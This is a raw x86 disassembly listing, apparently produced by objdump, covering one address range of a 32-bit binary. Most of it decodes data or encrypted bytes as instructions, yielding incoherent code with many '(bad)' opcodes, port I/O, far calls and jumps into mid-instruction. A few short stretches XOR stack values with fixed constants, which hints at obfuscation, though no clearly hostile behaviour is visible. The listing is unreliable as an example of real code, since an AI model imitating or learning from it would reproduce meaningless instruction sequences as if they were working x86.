  421463:	mov    edi,edx
  421465:	mov    eax,DWORD PTR [ebp-0x1f0]
  42146b:	jmp    0x421852
  421470:	out    0xc8,eax
  421472:	push   esi
  421473:	sub    esi,DWORD PTR [esi-0x44]
  421476:	mov    esp,0xfcb5630c
  42147b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42147c:	scas   eax,DWORD PTR es:[edi]
  42147d:	cmp    ecx,DWORD PTR [eax-0x6e]
  421480:	pop    ds
  421481:	mov    ebx,0xc44abec0
  421486:	mov    esi,0xe2814fbe
  42148b:	fisub  DWORD PTR [ebp+0x221984ac]
  421491:	jae    0x421499
  421493:	add    al,0x61
  421495:	cmp    BYTE PTR [eax-0x48],cl
  421498:	jne    0x4214d9
  42149a:	push   ecx
  42149b:	aad    0x62
  42149d:	and    eax,0xc4533e9f
  4214a2:	mov    esi,0x95260994
  4214a7:	sbb    eax,0x78d3bff1
  4214ac:	push   ss
  4214ad:	dec    esi
  4214ae:	xor    al,0xfb
  4214b0:	dec    ecx
  4214b1:	bound  esp,QWORD PTR [ecx]
  4214b3:	aad    0xb7
  4214b5:	add    DWORD PTR [eax+eax*8-0x50a3debd],0x7a5b588e
  4214c0:	cmp    dh,BYTE PTR [edx+0x2d691cee]
  4214c6:	pushaw 
  4214c8:	sub    DWORD PTR [edx],ebp
  4214ca:	mov    al,0xda
  4214cc:	daa    
  4214cd:	aas    
  4214ce:	or     ecx,DWORD PTR [eax+0x33730eae]
  4214d4:	mov    bl,0x35
  4214d6:	fdiv   QWORD PTR [edi-0x70c5d0f]
  4214dc:	adc    edi,0xe8946e95
  4214e2:	scas   eax,DWORD PTR es:[edi]
  4214e3:	in     eax,0x86
  4214e5:	sahf   
  4214e6:	mov    ecx,0x70e67a6c
  4214eb:	sub    ch,BYTE PTR [edi]
  4214ed:	xchg   edi,eax
  4214ee:	scas   eax,DWORD PTR es:[edi]
  4214ef:	in     al,0x2
  4214f1:	inc    ebx
  4214f2:	mov    eax,ds:0x39c46b12
  4214f7:	retf   
  4214f8:	test   eax,0xdab11265
  4214fd:	out    0xc7,al
  4214ff:	test   al,0xec
  421501:	stc    
  421502:	test   BYTE PTR [eax+0x6d],ah
  421505:	ret    0x9a5b
  421508:	push   ds
  421509:	in     al,dx
  42150a:	pop    esp
  42150b:	(bad)  
  42150c:	call   0xcdaa:0xeb992c61
  421513:	and    edi,ecx
  421515:	data16 add al,0x73
  421518:	mov    edi,0x24f01626
  42151d:	pop    esp
  42151e:	mov    edx,0xbc283188
  421523:	mov    edx,DWORD PTR [esi+eax*2+0x1c]
  421527:	fnstsw WORD PTR [bx+di-0x3595]
  42152c:	je     0x4214f9
  42152e:	(bad)  
  421530:	cdq    
  421531:	fcomp  DWORD PTR es:[edx+0x7a]
  421535:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421536:	push   edi
  421537:	in     eax,0x2c
  421539:	jg     0x4214c2
  42153b:	retf   
  42153c:	nop
  42153d:	(bad)  
  42153e:	bound  ebp,QWORD PTR [edi]
  421540:	std    
  421541:	fistp  WORD PTR [esi+0x6c7243fc]
  421547:	out    0x3b,al
  421549:	(bad)  
  42154a:	cmp    eax,0x49cec97b
  42154f:	into   
  421550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421551:	sahf   
  421552:	jge    0x4215a0
  421554:	adc    DWORD PTR [eax],ebp
  421556:	das    
  421557:	data16 or al,0xd1
  42155a:	mov    eax,ds:0xdf4c23a
  42155f:	femms  
  421561:	cmp    edi,0xfffffffe
  421564:	jns    0x421545
  421566:	in     eax,0xe7
  421568:	adc    al,0xc8
  42156a:	adc    esi,ebp
  42156c:	lods   al,BYTE PTR ds:[esi]
  42156d:	hlt    
  42156e:	adc    eax,0xc1940615
  421573:	out    0x70,al
  421575:	and    ebx,edx
  421577:	dec    ebp
  421578:	xchg   edi,eax
  421579:	out    dx,al
  42157a:	repnz cmp DWORD PTR [eax+0x35],edx
  42157e:	aaa    
  42157f:	int3   
  421580:	std    
  421581:	or     al,0xf
  421583:	bound  eax,QWORD PTR [eax+0x38]
  421586:	jg     0x421586
  421588:	jecxz  0x4215f8
  42158a:	lahf   
  42158b:	pop    eax
  42158c:	adc    BYTE PTR [edi-0x671214af],ah
  421592:	out    dx,al
  421593:	push   ss
  421594:	pushf  
  421595:	aaa    
  421596:	adc    BYTE PTR [edx+ebp*2-0xc],al
  42159a:	mov    bl,0x37
  42159c:	cwde   
  42159d:	out    dx,eax
  42159e:	out    0xcc,eax
  4215a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215a1:	adc    bh,BYTE PTR [eax-0x42]
  4215a4:	(bad)  
  4215a5:	test   eax,0x96fbf61d
  4215aa:	or     al,0xb0
  4215ac:	pop    es
  4215ad:	jg     0x421600
  4215af:	js     0x421586
  4215b1:	jbe    0x421571
  4215b3:	add    cl,bl
  4215b5:	repz pop ds
  4215b7:	adc    dl,bh
  4215b9:	push   cs
  4215ba:	cdq    
  4215bb:	stos   BYTE PTR es:[edi],al
  4215bc:	pop    ebx
  4215bd:	ds mov esi,0xf7d089a2
  4215c3:	inc    ecx
  4215c4:	add    al,0xc8
  4215c6:	or     DWORD PTR [edx-0x7b],edx
  4215c9:	xor    al,0x8c
  4215cb:	daa    
  4215cc:	pop    esp
  4215cd:	imul   edx,DWORD PTR [edi],0xffffffa0
  4215d0:	cwde   
  4215d1:	stos   BYTE PTR es:[edi],al
  4215d2:	and    BYTE PTR [ebx-0x33bcb470],ah
  4215d8:	scas   al,BYTE PTR es:[edi]
  4215d9:	jecxz  0x42159c
  4215db:	(bad)  
  4215dc:	in     eax,dx
  4215dd:	dec    ecx
  4215de:	out    0x3e,eax
  4215e0:	int3   
  4215e1:	push   ss
  4215e2:	push   ds
  4215e3:	(bad)  
  4215e4:	lods   al,BYTE PTR ds:[esi]
  4215e5:	imul   edi,DWORD PTR [edi-0x2c],0x62
  4215e9:	push   ss
  4215ea:	dec    esi
  4215eb:	jmp    0x42163a
  4215ed:	sub    esi,DWORD PTR [edx+edx*1]
  4215f0:	fisubr WORD PTR [edi+eiz*8]
  4215f3:	jl     0x4215f1
  4215f5:	outs   dx,DWORD PTR ds:[esi]
  4215f6:	bound  ecx,QWORD PTR [ebx+esi*8+0x1f]
  4215fa:	ins    BYTE PTR es:[edi],dx
  4215fb:	cmp    eax,0xfedbc1a3
  421600:	(bad)
  421603:	xor    ebx,edi
  421605:	add    ch,ch
  421607:	inc    ebp
  421608:	loope  0x421642
  42160a:	xor    edi,DWORD PTR [eax+0x1b]
  42160d:	sar    DWORD PTR [esi-0x6d],0xde
  421611:	jl     0x4215be
  421613:	icebp  
  421614:	push   edx
  421615:	lock lahf 
  421617:	repnz aad 0xac
  42161a:	imul   esp,esi,0x26
  42161d:	add    ax,0xe240
  421621:	cld    
  421622:	jo     0x421673
  421624:	idiv   BYTE PTR [ecx+ecx*1+0x7]
  421628:	nop
  421629:	xchg   DWORD PTR [edi-0x2b],edx
  42162c:	cli    
  42162d:	mov    cl,0x3a
  42162f:	js     0x42162f
  421631:	sahf   
  421632:	push   0x38
  421634:	and    BYTE PTR [eax-0x50b24a5a],bh
  42163a:	daa    
  42163b:	les    edi,FWORD PTR [esi-0x61523473]
  421641:	stos   BYTE PTR es:[edi],al
  421642:	dec    ebp
  421643:	neg    BYTE PTR ds:0x5cc42785
  421649:	imul   esp,esp,0x71b9519f
  42164f:	mov    cl,0xf8
  421651:	add    edx,DWORD PTR [ebp+esi*2-0x70]
  421655:	popa   
  421656:	sub    edi,DWORD PTR [ebx+0x48]
  421659:	retf   0x971c
  42165c:	jecxz  0x4216bc
  42165e:	(bad)  
  42165f:	sbb    edi,edx
  421661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421662:	push   ss
  421663:	push   es
  421664:	or     BYTE PTR ds:0xb8ecfc21,cl
  42166a:	data16 (bad) 
  42166c:	pop    esi
  42166d:	xlat   BYTE PTR ds:[ebx]
  42166e:	mov    ch,0x4
  421670:	sbb    al,0x67
  421672:	xor    DWORD PTR [ebp+0x32396af8],edx
  421678:	xchg   BYTE PTR [edi+0x1340bc62],dh
  42167e:	imul   eax,DWORD PTR [edx+0x10],0xf38e80f5
  421685:	mov    ah,0x7e
  421687:	lahf   
  421688:	rcr    BYTE PTR [edx+0xb],0x31
  42168c:	pop    ebx
  42168d:	jae    0x42170e
  42168f:	adc    al,0x90
  421691:	imul   esi,DWORD PTR [edx-0x3b218057],0x58
  421698:	sbb    edi,DWORD PTR [ebx]
  42169a:	jae    0x4216f0
  42169c:	aas    
  42169d:	stc    
  42169e:	xchg   edi,eax
  42169f:	xor    BYTE PTR [ebx+edx*8],bl
  4216a2:	sbb    eax,0xdfac440e
  4216a7:	pop    es
  4216a8:	and    esp,DWORD PTR [ebx-0x62296dc5]
  4216ae:	inc    ebp
  4216af:	push   0x67fd5d04
  4216b4:	dec    ebp
  4216b5:	jmp    0x68170ea2
  4216ba:	std    
  4216bb:	xlat   BYTE PTR ds:[ebx]
  4216bc:	xor    al,BYTE PTR [ecx]
  4216be:	add    esp,DWORD PTR [ecx+0x3d085143]
  4216c4:	pop    esi
  4216c5:	or     BYTE PTR [edx-0x79655d46],bl
  4216cb:	sbb    DWORD PTR [ebx+0x1d],ebp
  4216ce:	xor    eax,0x106c9e
  4216d3:	ins    DWORD PTR es:[edi],dx
  4216d4:	loopne 0x4216e7
  4216d6:	inc    edi
  4216d7:	jnp    0x4216c9
  4216d9:	test   al,0x8d
  4216db:	out    0x5a,eax
  4216dd:	lock mov al,0x9b
  4216e0:	mov    cl,0xda
  4216e2:	or     BYTE PTR [edi-0x731fdeb0],ah
  4216e8:	enter  0xce48,0x7e
  4216ec:	stos   DWORD PTR es:[edi],eax
  4216ed:	sbb    eax,DWORD PTR [ecx+0x70]
  4216f0:	rep ins DWORD PTR es:[edi],dx
  4216f2:	or     al,0x74
  4216f4:	jge    0x4216d1
  4216f6:	outs   dx,BYTE PTR ds:[esi]
  4216f7:	mov    ebx,0xe2fcd4f4
  4216fc:	jmp    DWORD PTR [eax+0x58ceeaeb]
  421702:	arpl   cx,dx
  421704:	addr16 mov ds:0xcc38,al
  421708:	mov    ds:0xa800f9da,al
  42170d:	sbb    al,0x91
  42170f:	mov    dh,0xf9
  421711:	out    dx,eax
  421712:	or     ah,bl
  421714:	in     eax,0x44
  421716:	(bad)
  42171b:	mov    edx,0x393a6132
  421720:	retf   
  421721:	xor    al,0x66
  421723:	jbe    0x421767
  421725:	ret    0xbae3
  421728:	mov    dl,0xbc
  42172a:	(bad)  
  42172b:	xchg   edi,eax
  42172c:	ror    esp,cl
  42172e:	xor    BYTE PTR [esi],0x55
  421731:	icebp  
  421732:	sahf   
  421733:	popf   
  421734:	dec    esi
  421735:	adc    al,0x14
  421737:	call   0x231bc163
  42173c:	lods   eax,DWORD PTR ds:[esi]
  42173d:	les    ebx,FWORD PTR [edi-0x75748deb]
  421743:	push   eax
  421744:	hlt    
  421745:	pop    esi
  421746:	xor    esp,DWORD PTR [ebx+0x3887da2e]
  42174c:	and    BYTE PTR [ecx],cl
  42174e:	jmp    0x42176d
  421750:	dec    eax
  421751:	adc    al,0xbf
  421753:	mov    esp,0x3716bbfc
  421758:	leave  
  421759:	fisttp QWORD PTR [edx-0x65b19d8f]
  42175f:	xor    eax,0x2505a4b5
  421764:	ror    BYTE PTR [eax-0x3a4f18f9],1
  42176a:	mov    edx,0xb3ef4b9e
  42176f:	leave  
  421770:	sbb    ah,0x6d
  421773:	nop
  421774:	mov    dh,BYTE PTR [ebp+edx*4+0x74]
  421778:	jmp    0x421723
  42177a:	push   ds
  42177b:	xchg   esi,eax
  42177c:	adc    edx,edx
  42177e:	test   eax,0x59857a47
  421783:	xor    eax,0x6aaaccec
  421788:	add    ch,cl
  42178a:	jns    0x421713
  42178c:	mov    dl,0x2c
  42178e:	dec    edi
  42178f:	or     eax,0xd8a2a2a6
  421794:	jl     0x4217d4
  421796:	shl    bl,cl
  421798:	outs   dx,DWORD PTR ds:[esi]
  421799:	rol    BYTE PTR [ecx],0xa
  42179c:	les    ebx,FWORD PTR [eax]
  42179e:	fwait
  42179f:	pop    edx
  4217a0:	adc    BYTE PTR [edi-0x77],al
  4217a3:	jmp    0x3d90a4ae
  4217a8:	jge    0x421782
  4217aa:	sub    eax,0x2ee78626
  4217af:	mov    ch,BYTE PTR [edx-0x4f76b5fb]
  4217b5:	test   al,0x6f
  4217b7:	xchg   edx,eax
  4217b8:	or     al,0xe3
  4217ba:	popa   
  4217bb:	mov    DWORD PTR [esi*8+0x1733abb5],eax
  4217c2:	mov    ecx,0x176d5648
  4217c7:	fild   QWORD PTR [edx-0x60b36e55]
  4217cd:	loop   0x4217d6
  4217cf:	xor    BYTE PTR [edx],bl
  4217d1:	rcl    DWORD PTR [edi-0x7d],1
  4217d4:	pusha  
  4217d5:	nop
  4217d6:	or     dh,dh
  4217d8:	stc    
  4217d9:	cmp    dl,BYTE PTR [esi-0x7d]
  4217dc:	mov    esp,0xf725aa71
  4217e1:	shl    ah,0x79
  4217e4:	mov    cl,BYTE PTR [eax+0x612963f]
  4217ea:	add    bh,BYTE PTR [eax]
  4217ec:	jno    0x4217c3
  4217ee:	jne    0x4217ae
  4217f0:	add    dl,BYTE PTR [esi]
  4217f2:	and    dl,dl
  4217f4:	(bad)  
  4217f5:	fldcw  WORD PTR [ebx]
  4217f7:	nop
  4217f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f9:	stc    
  4217fa:	ficom  DWORD PTR [edx-0x39068603]
  421800:	and    eax,0xd4c7831d
  421805:	mov    ebp,DWORD PTR [esi+eiz*8]
  421808:	mov    eax,0xe25aeefb
  42180d:	test   bl,dh
  42180f:	sub    dh,BYTE PTR [edx-0x44]
  421812:	mov    ds:0x534c90c2,eax
  421817:	mov    al,0xdd
  421819:	sub    DWORD PTR [esi+0x33],eax
  42181c:	inc    ebp
  42181d:	xchg   ebx,eax
  42181e:	into   
  42181f:	jle    0x42180c
  421821:	bound  edx,QWORD PTR [ebx-0x45]
  421824:	xchg   ecx,eax
  421825:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421828:	je     0x4217b8
  42182a:	push   esi
  42182b:	mov    ds:0x83eef806,eax
  421830:	xor    DWORD PTR ds:0xcc68a978,0x7cf568eb
  42183a:	hlt    
  42183b:	call   0x83bda76
  421840:	adc    eax,0x1b9ed4e6
  421845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421846:	aaa    
  421847:	bound  esi,QWORD PTR [ecx+0x52]
  42184a:	pop    ds
  42184b:	push   ds
  42184c:	in     al,dx
  42184d:	and    eax,0x40440b82
  421852:	mov    edx,DWORD PTR [ebp-0x1ec]
  421858:	xor    eax,0xcb79b576
  42185d:	xor    edx,0x9c2b8ae8
  421863:	mov    cl,0x3e
  421865:	call   0x4223f7
  42186a:	or     esi,eax
  42186c:	or     edi,edx
  42186e:	mov    DWORD PTR [ebp-0x1f8],esi
  421874:	jmp    0x421cb0
  421879:	mov    eax,DWORD PTR [ebp-0x1e0]
  42187f:	mov    edx,DWORD PTR [ebp-0x1dc]
  421885:	xor    eax,0xcb79b576
  42188a:	xor    edx,0x9c2b8ae8
  421890:	mov    cl,0x2
  421892:	call   0x408bb8
  421897:	mov    esi,eax
  421899:	mov    edi,edx
  42189b:	mov    eax,DWORD PTR [ebp-0x1e0]
  4218a1:	mov    edx,DWORD PTR [ebp-0x1dc]
  4218a7:	xor    eax,0xcb79b576
  4218ac:	xor    edx,0x9c2b8ae8
  4218b2:	mov    cl,0x3e
  4218b4:	call   0x4223f7
  4218b9:	or     esi,eax
  4218bb:	or     edi,edx
  4218bd:	jmp    0x421ca4
  4218c2:	sbb    bh,BYTE PTR [esi]
  4218c4:	shr    DWORD PTR [edx+0x6ebaba9a],1
  4218ca:	daa    
  4218cb:	xchg   DWORD PTR [eax-0x2f],ebp
  4218ce:	pushf  
  4218cf:	enter  0x9248,0xac
  4218d3:	rol    eax,0xbe
  4218d6:	dec    edx
  4218d7:	les    edi,FWORD PTR [esi-0x1d321f42]
  4218dd:	fidivr DWORD PTR [ecx+edx*4+0x2b]
  4218e1:	jae    0x421885
  4218e3:	jle    0x421924
  4218e5:	or     al,0xc1
  4218e7:	and    DWORD PTR [edi+0x3cec70ef],0x81fb2bac
  4218f1:	xor    BYTE PTR [esi+ecx*8+0x59],dl
  4218f5:	add    ch,BYTE PTR [edi-0x294b3378]
  4218fb:	xor    ecx,0xb024f5fd
  421901:	ja     0x421980
  421903:	dec    esi
  421904:	inc    esi
  421905:	jp     0x42194c
  421907:	and    DWORD PTR [ecx-0x17fe147b],edi
  42190d:	xchg   ecx,eax
  42190e:	arpl   WORD PTR [esi+ecx*8+0x1f6f75e4],di
  421915:	pop    edi
  421916:	int3   
  421917:	inc    edx
  421918:	ret    
  421919:	mov    ch,0x2d
  42191b:	fdiv   QWORD PTR [eax+0x29c0ed3d]
  421921:	loope  0x4218e5
  421923:	les    esp,FWORD PTR [ebx+0x47]
  421926:	jmp    0x7ec9:0x5f16b1eb
  42192d:	or     eax,0xfd3050fc
  421932:	in     eax,dx
  421933:	sahf   
  421934:	jp     0x4218ef
  421936:	xchg   esp,eax
  421937:	in     al,dx
  421938:	jo     0x42192c
  42193a:	lods   eax,DWORD PTR ds:[esi]
  42193b:	sub    eax,eax
  42193d:	js     0x421964
  42193f:	cdq    
  421940:	fsub   DWORD PTR [esi+ebp*2-0x2d680c07]
  421947:	or     al,0x47
  421949:	and    BYTE PTR [eax],bl
  42194b:	dec    edx
  42194c:	sub    ah,BYTE PTR [edx-0x580e80f7]
  421952:	(bad)  
  421953:	xchg   si,ax
  421955:	mov    gs,edi
  421957:	mov    bh,0x69
  421959:	mov    eax,0xc54d0200
  42195e:	cli    
  42195f:	and    al,dh
  421961:	icebp  
  421962:	pop    es
  421963:	cld    
  421964:	xchg   cl,ch
  421966:	jno    0x4219c0
  421968:	jle    0x4218f2
  42196a:	push   0xffffff81
  42196c:	cdq    
  42196d:	xchg   edx,eax
  42196e:	mov    esi,0x83cd9d4f
  421973:	les    edx,FWORD PTR [ebx+0x29]
  421976:	fnstsw WORD PTR [edx-0xe]
  421979:	jp     0x421977
  42197b:	xor    eax,0xfe772fe9
  421981:	jae    0x421979
  421983:	xrelease xchg BYTE PTR [edx+0x46],cl
  421987:	pop    es
  421988:	dec    edi
  421989:	das    
  42198a:	or     edx,DWORD PTR [eax-0x1b76e41]
  421990:	scas   al,BYTE PTR es:[edi]
  421991:	push   cs
  421992:	popa   
  421993:	mov    ds:0xdb870d40,al
  421998:	aaa    
  421999:	xchg   DWORD PTR [ecx+0x1b96e911],esp
  42199f:	rol    DWORD PTR [ebp+0x40],1
  4219a2:	inc    ebp
  4219a3:	hlt    
  4219a4:	and    al,0x69
  4219a6:	pusha  
  4219a7:	out    dx,al
  4219a8:	push   esi
  4219a9:	mov    ebp,0x19a6c883
  4219ae:	idiv   DWORD PTR [esi-0x2ccb2a0d]
  4219b4:	jle    0x42196b
  4219b6:	push   ss
  4219b7:	cmc    
  4219b8:	mov    esi,0x983b5018
  4219bd:	adc    DWORD PTR [eax+esi*2+0x51],0xffffff90
  4219c2:	jns    0x421a35
  4219c4:	outs   dx,DWORD PTR ds:[esi]
  4219c5:	into   
  4219c6:	add    eax,0xf2d0ccc9
  4219cb:	mov    ch,0xe
  4219cd:	xchg   edi,eax
  4219ce:	iret   
  4219cf:	add    eax,0xe3e6ac72
  4219d4:	sbb    DWORD PTR [edi+eax*4-0x5d],edx
  4219d8:	adc    bh,BYTE PTR [ebx-0x3e935e98]
  4219de:	cmp    al,0x11
  4219e0:	pop    eax
  4219e1:	adc    ecx,DWORD PTR [edi+0x32]
  4219e4:	sub    eax,ecx
  4219e6:	(bad)  
  4219e7:	fadd   DWORD PTR [esi]
  4219e9:	mov    al,ds:0x7d5fd1bd
  4219ee:	sub    al,0x99
  4219f0:	outs   dx,DWORD PTR ds:[esi]
  4219f1:	push   edi
  4219f2:	or     al,BYTE PTR [edi]
  4219f4:	ins    BYTE PTR es:[edi],dx
  4219f5:	aas    
  4219f6:	pop    ds
  4219f7:	data16 gs jnp 0x421a02
  4219fb:	push   ebp
  4219fc:	or     BYTE PTR [ecx],bh
  4219fe:	daa    
  4219ff:	ret    0x4ef3
  421a02:	mov    BYTE PTR [esi],bl
  421a04:	test   al,0xc8
  421a06:	(bad)  
  421a07:	mov    al,ds:0x67d5e19e
  421a0c:	rcr    DWORD PTR [edi-0x3e],1
  421a0f:	mov    esp,0x78e45c1f
  421a14:	fidiv  DWORD PTR [esi+0x3a56d1d6]
  421a1a:	outs   dx,DWORD PTR ds:[esi]
  421a1b:	fild   DWORD PTR [ebx]
  421a1d:	mov    ch,0x32
  421a1f:	and    eax,0x7bcf4d12
  421a24:	add    ebp,DWORD PTR [eax-0x4be340b9]
  421a2a:	jne    0x421a3b
  421a2c:	aam    0xda
  421a2e:	sub    al,0xca
  421a30:	cs clc 
  421a32:	and    esp,DWORD PTR [eax-0x79]
  421a35:	xchg   BYTE PTR [ebp-0x5ece73a3],al
  421a3b:	add    DWORD PTR [eax+0x41c21ed0],esi
  421a41:	popf   
  421a42:	test   edx,0xbe1b79a6
  421a48:	mov    esi,0xfe36a43b
  421a4d:	setno  ch
  421a50:	mov    ds:0x8eba7232,al
  421a55:	inc    ebp
  421a56:	mov    ecx,0xbed2aedc
  421a5b:	adc    eax,0xf960b458
  421a60:	cmp    ch,cl
  421a62:	fdiv   QWORD PTR [esi-0x474999af]
  421a68:	and    BYTE PTR [ecx+ebx*4-0x77],ah
  421a6c:	lds    edi,FWORD PTR [ecx+esi*2]
  421a6f:	lods   eax,DWORD PTR ds:[esi]
  421a70:	inc    edi
  421a71:	inc    edi
  421a72:	mov    esi,0x73b4c64
  421a77:	stc    
  421a78:	ret    
  421a79:	or     eax,0xd36fe179
  421a7e:	cld    
  421a7f:	adc    eax,0xaf618563
  421a84:	lds    ebx,FWORD PTR [eax]
  421a86:	and    al,BYTE PTR [ecx-0x141dcaa9]
  421a8c:	(bad)
  421a8f:	ins    DWORD PTR es:[edi],dx
  421a90:	shl    BYTE PTR ds:0x354d54,1
  421a96:	jno    0x421ab9
  421a98:	xor    esp,DWORD PTR [ebx]
  421a9a:	mov    ebp,0x90e00f95
  421a9f:	xor    BYTE PTR [edi+0x3c],bl
  421aa2:	jbe    0x421a69
  421aa4:	out    dx,al
  421aa5:	ret    
  421aa6:	sbb    al,0x25
  421aa8:	stos   BYTE PTR es:[edi],al
  421aa9:	idiv   DWORD PTR [ecx+ebp*4]
  421aac:	cmp    ebx,DWORD PTR [ebx-0x3d5323b2]
  421ab2:	sub    BYTE PTR ds:0xddf1b662,dl
  421ab8:	call   0x7b05:0x89d03f05
  421abf:	int    0x6b
  421ac1:	mov    eax,ds:0x3863c4b5
  421ac6:	stos   BYTE PTR es:[edi],al
  421ac7:	(bad)  
  421ac8:	cld    
  421ac9:	nop
  421aca:	in     al,dx
  421acb:	xor    al,0xd2
  421acd:	cmp    al,0xba
  421acf:	mov    edi,0x5ff552da
  421ad4:	adc    eax,0xbc0353f7
  421ad9:	push   edx
  421ada:	loopne 0x421aef
  421adc:	sbb    cl,ah
  421ade:	int    0xee
  421ae0:	pop    esp
  421ae1:	(bad)  
  421ae2:	pop    esp
  421ae3:	mov    eax,ds:0xd6665c4c
  421ae8:	mov    ecx,0x4d7967c6
  421aed:	push   ecx
  421aee:	(bad)  
  421aef:	cmp    DWORD PTR [ecx+0x53102b00],esp
  421af5:	jmp    0xaa3d:0xb31c6afb
  421afc:	xchg   edi,eax
  421afd:	idiv   bh
  421aff:	inc    ebx
  421b00:	call   FWORD PTR [ecx]
  421b02:	push   ds
  421b03:	test   eax,0x5f3e8a72
  421b08:	or     al,0x85
  421b0a:	shl    dl,cl
  421b0c:	sbb    BYTE PTR [ebp-0x4ca9949],bh
  421b12:	test   eax,0xe7c566b6
  421b17:	jo     0x421ac3
  421b19:	aam    0x51
  421b1b:	mov    ?,esi
  421b1d:	and    al,0xae
  421b1f:	test   eax,0x334a7b35
  421b24:	aam    0x84
  421b26:	push   edx
  421b27:	sub    BYTE PTR [eax+0x73],ah
  421b2a:	mov    ecx,esp
  421b2c:	sti    
  421b2d:	push   ebx
  421b2e:	int3   
  421b2f:	fisub  WORD PTR [ebp-0x32b7eee0]
  421b35:	cmp    bh,ch
  421b37:	xlat   BYTE PTR ds:[ebx]
  421b38:	xchg   ebp,eax
  421b39:	xchg   ecx,eax
  421b3a:	cmp    esp,edi
  421b3c:	popa   
  421b3d:	jecxz  0x421b96
  421b3f:	mov    eax,0xf4e8850d
  421b44:	push   ebx
  421b45:	jno    0x421adb
  421b47:	mov    al,0x47
  421b49:	pop    ebp
  421b4a:	rcl    DWORD PTR [esi-0x6e99c9d3],1
  421b50:	mov    bl,cl
  421b52:	add    BYTE PTR [esi-0x69],ch
  421b55:	inc    ebp
  421b56:	pushf  
  421b57:	mov    al,ds:0x2869740a
  421b5c:	or     DWORD PTR [ebp+0x7b0e14d0],esp
  421b62:	adc    BYTE PTR [ebp-0x76427101],ch
  421b68:	out    dx,al
  421b69:	xor    al,0x2c
  421b6b:	je     0x421b03
  421b6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b6e:	sti    
  421b6f:	pop    ebx
  421b70:	ret    0xe74
  421b73:	mov    eax,ds:0xeaf5e715
  421b78:	dec    esi
  421b79:	jecxz  0x421ba2
  421b7b:	and    al,0xdc
  421b7d:	push   ebp
  421b7e:	retf   0x30f0
  421b81:	pushf  
  421b82:	or     ecx,DWORD PTR [ebp-0x77d69674]
  421b88:	aam    0x7b
  421b8a:	pushf  
  421b8b:	out    dx,al
  421b8c:	imul   esi,edx,0xffffff92
  421b8f:	add    DWORD PTR [ebp-0x340cae7],esp
  421b95:	jecxz  0x421bcc
  421b97:	push   ebx
  421b98:	inc    esi
  421b99:	cmp    eax,0xc840c8c5
  421b9e:	inc    esi
  421b9f:	jne    0x421c18
  421ba1:	stc    
  421ba2:	ds test al,0x47
  421ba5:	jp     0x421c22
  421ba7:	ret    0x79fc
  421baa:	fnop   
  421bac:	and    ecx,DWORD PTR [eax+0x66]
  421baf:	(bad)  
  421bb0:	and    ch,BYTE PTR [edx+edi*4]
  421bb3:	pop    eax
  421bb4:	and    BYTE PTR [ebp+0x2e4aef3f],dl
  421bba:	gs xchg esp,eax
  421bbc:	out    dx,eax
  421bbd:	jns    0x421c36
  421bbf:	mov    BYTE PTR [ecx],cl
  421bc1:	sub    ebx,DWORD PTR [esi]
  421bc3:	fldcw  WORD PTR [ebx-0x7f3c8985]
  421bc9:	stos   DWORD PTR es:[edi],eax
  421bca:	data16 mov ah,0xa8
  421bcd:	outs   dx,DWORD PTR ds:[esi]
  421bce:	inc    ebp
  421bcf:	(bad)  [edx]
  421bd1:	push   eax
  421bd2:	fsubr  DWORD PTR ds:0x1b9e2c98
  421bd8:	cld    
  421bd9:	loope  0x421c4b
  421bdb:	test   BYTE PTR ds:0x2123dc37,0xff
  421be2:	mov    ds:0x43c208ce,al
  421be7:	loop   0x421c23
  421be9:	mov    fs,WORD PTR [ebx+ebx*4]
  421bec:	or     bh,BYTE PTR [ecx]
  421bee:	outs   dx,DWORD PTR es:[esi]
  421bf0:	and    al,0x14
  421bf2:	xchg   esp,eax
  421bf3:	mov    ds:0x469784b9,al
  421bf8:	xchg   edi,eax
  421bf9:	push   cs
  421bfa:	xchg   edi,eax
  421bfb:	int    0x3a
  421bfd:	daa    
  421bfe:	jl     0x421c45
  421c00:	repnz shr DWORD PTR [ebp+0x23],cl
  421c04:	call   0x32bf:0xfc04e5fa
  421c0b:	xor    BYTE PTR [esi+eax*1],dl
  421c0e:	mov    ebp,0x5df6ea47
  421c13:	adc    ah,bl
  421c15:	shr    BYTE PTR [ecx+0x6293d8ce],cl
  421c1b:	push   esp
  421c1c:	(bad)  
  421c1d:	sbb    ebx,DWORD PTR [ecx+0x39]
  421c20:	adc    esp,edi
  421c22:	jo     0x421c69
  421c24:	fcmovnbe st,st(5)
  421c26:	jp     0x421bd6
  421c28:	jbe    0x421ca8
  421c2a:	xchg   ecx,eax
  421c2b:	(bad)  
  421c2c:	jg     0x421bed
  421c2e:	call   0xa946b9f0
  421c33:	mov    BYTE PTR [esi],al
  421c35:	call   0xb3a8:0xf2279a68
  421c3c:	xor    ch,cl
  421c3e:	jno    0x421bf6
  421c40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c41:	repnz and edi,DWORD PTR [eax+0x73]
  421c45:	jae    0x421c61
  421c47:	sub    dl,dh
  421c49:	add    eax,edx
  421c4b:	xchg   edx,eax
  421c4c:	add    al,0xbc
  421c4e:	sbb    eax,0xe194ac87
  421c53:	add    ebp,ebp
  421c55:	mul    ah
  421c57:	ins    BYTE PTR es:[edi],dx
  421c58:	xchg   ecx,eax
  421c59:	cmp    eax,0xadfabe40
  421c5e:	retf   0x752e
  421c61:	adc    dl,bl
  421c63:	mov    al,ds:0x89e02e57
  421c68:	or     BYTE PTR [ebx+0x44ca0968],bl
  421c6e:	into   
  421c6f:	test   BYTE PTR [ebp-0x144badff],dh
  421c75:	xchg   ecx,eax
  421c76:	sbb    BYTE PTR [ebp-0x74675bfd],cl
  421c7c:	retf   0x2c05
  421c7f:	mov    ch,0x14
  421c81:	stos   BYTE PTR es:[edi],al
  421c82:	sub    DWORD PTR [ecx-0x48a5a8cd],edx
  421c88:	jnp    0x421c78
  421c8a:	je     0x421cfb
